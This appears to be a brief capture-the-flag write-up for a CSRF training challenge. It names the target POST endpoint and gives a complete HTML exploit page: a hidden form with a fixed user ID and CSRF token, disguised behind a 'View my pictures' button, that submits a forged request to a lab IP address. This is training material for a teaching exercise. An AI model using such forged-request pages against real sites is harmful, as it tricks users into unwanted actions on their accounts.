# Challenge

```http
POST /user/csrfchallengefour/plusplus  
```

With the following parameters;
```http
 userId = exampleId & csrfToken = yourCsrfToken
```

# Resolve

```html
<!doctype html>
<html>
<head>
	<title>Our Funky HTML Page</title>
	<meta name="description" content="Our first page">
	<meta name="keywords" content="html tutorial template">
</head>
<body>

	<form action="https://10.63.253.66/user/csrfchallengefour/plusplus" method="POST">
		<input type="hidden" name="userid" value="47887913a0f9573d479fbd600fa02ac6ef0575bd"/>
		<input type="hidden" name="csrfToken" value="65326995743979344268015371628778330152"/>
		<input type="submit" value="View my pictures"/>
	</form>
</body>
</html>
```